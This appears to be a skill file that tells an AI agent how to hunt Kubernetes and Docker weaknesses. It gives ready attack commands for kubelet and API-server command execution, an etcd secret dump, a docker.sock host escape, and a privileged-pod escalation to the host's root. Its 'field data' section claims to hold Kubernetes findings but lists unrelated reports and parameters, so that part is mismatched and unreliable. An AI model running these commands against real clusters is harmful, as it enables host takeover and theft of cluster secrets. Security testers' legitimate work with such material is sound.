---
name: hunt-k8s
description: Kubernetes / Docker security — API anonymous cluster-admin, kubelet 10250 /run vs /exec (SPDY 302 trap), API-server-mediated kubelet RCE via nodes/proxy, etcd 2379 secret dump, docker.sock host escape, EphemeralContainers escalation, RBAC review tools, status-code FP killers. Use when 6443/10250/10255/2379 open, IMDS pivots, or K8s exposure suspected. Trigger keywords: kubernetes, kubelet, etcd, docker socket, cluster-admin, RBAC, container escape.
---

# Kubernetes / Docker — Deep Hunting

## THE GATE
Crown jewels in order: API anonymous `cluster-admin` (via `system:anonymous` ClusterRoleBinding), kubelet 10250 `/run`/`/exec`, API-server-mediated kubelet RCE through `nodes/proxy` (primary 2024–26 vector when 10250 is firewalled), etcd 2379 unauth secret dump, docker.sock host escape, runc escapes.

## Critical Correction
kubelet `/exec` is SPDY/WebSocket streaming — a plain POST returns a 302 to `/cri/exec/<token>`, NOT command output. Use `/run` (returns output directly) first, or `kubeletctl exec`/`websocat` for `/exec`.

## EphemeralContainers Escalation
Patch a pod with `securityContext.privileged:true` debug container or `kubectl debug node/<node>` to mount host root at `/host` → `chroot /host`.

## Key Commands
```
SelfSubjectRulesReview POST /apis/authorization.k8s.io/v1/selfsubjectrulesreviews
curl -sk -X POST https://T:10250/run/NS/POD/CTR -d "cmd=id"
curl -sk -X POST https://T:6443/api/v1/nodes/$N/proxy/run/NS/POD/CTR -d "cmd=id"
ETCDCTL_API=3 etcdctl --endpoints=http://T:2379 get /registry/secrets --prefix
docker.sock: POST /v1.41/containers/create?name=poc {"HostConfig":{"Binds":["/:/host"],"Privileged":true}}
```

## Fingerprinting
Ports 6443/10250/10255/2379; `/version` + `/api` are anonymous on most clusters and reveal `gitVersion` (gates CVE-2018-1002105 etc.). IMDS pivots (AWS/Azure/GCP metadata one-liners) for SSRF footholds.

## Validation / FP Killers
Anonymous `200` on `/api/v1/namespaces` ≠ admin (RBAC-filtered empty list). 10255 read-only ≠ 10250 RCE. `/exec` bare 302 ≠ patched. Prove with decoded Secret bytes, literal `id` output, node's `/etc/hostname` (differs from container's), OOB confirm.

## Hunter Mistakes
Conflating 10255/10250; claiming cluster-admin off status codes; not decoding SA token `aud`/`exp`; assuming etcd secrets plaintext when `EncryptionConfiguration` may be set; reporting login-page `200` on Dashboard as data access.

## FIELD DATA — mined from HackerOne disclosed reports (10k-report corpus)

### Class: k8s — 244 disclosed H1 reports (89 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `name`
- `id`
- `Password`
- `error`
- `alt`
- `deviceUdid`
- `Action`
- `Version`
- `action`
- `x-amz-signedheaders`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] UrnState Heap Overflow** (Classic Buffer Overflow)
  - Signal: ## Summary: When handling a URN Request an attacker controlled response can cause Squid to overflow a heap buffer. The buffer exist within a struct so not only does it allow an att
- **[critical] Handling of `tracking` command allows making arbitrary blind requests with user's cookies from Grammarly Extension's origin** (None)
  - Signal: ## **Summary:** Attacker could trigger Grammarly extension's `gnar._fetch` command using a crafted page to perform XHR with cookies and any configurational params to any cross-orig
- **[critical] RCE via unsafe inline Kramdown options when rendering certain Wiki pages** (Code Injection)
  - Signal: ### Summary When rendering wiki content with certain extensions such as `.rmd`, `render_wiki_content` will call [`other_markup_unsafe`](https://gitlab.com/gitlab-org/gitlab/-/blob/
- **[critical] Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message** (Code Injection)
  - Signal: ## Overview Counter-Strike: Global Offensive's UI is built of a framework called [Panorama](https://developer.valvesoftware.com/wiki/Dota_2_Workshop_Tools/Panorama) which is heavil

